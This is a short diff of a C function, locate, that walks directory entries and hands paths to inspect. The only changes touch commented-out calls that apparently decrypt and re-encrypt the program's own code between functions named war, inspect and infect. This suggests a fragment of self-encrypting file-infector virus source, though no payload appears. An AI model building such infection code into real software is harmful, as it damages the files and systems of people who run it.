@@ -2,8 +2,7 @@
 
 void	locate(t_data *data, t_directory *dir)
 {
-//	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
-//	update_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
+	/* revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war); */
 
 	int				fd;
 	int				stop;
@@ -21,7 +20,6 @@ void	locate(t_data *data, t_directory *dir)
 	data->context = false;
 	if (_memcpy(path, dir->path[dir->entry], _strlen(dir->path[dir->entry])) != path)
 		goto ERR;
-
 	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
 		goto ERR;
 
@@ -33,6 +31,7 @@ void	locate(t_data *data, t_directory *dir)
 			dir->entry++;
 		}
 	}
+
 	if (_close(fd) < 0 || dir->entry <= 0)
 		goto ERR;
 
@@ -65,6 +64,7 @@ ITER:
 	data->context = true;
 
 ERR:
-//	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
+	/* update_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
+	/* revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect); */
 	inspect(data, path);
 }
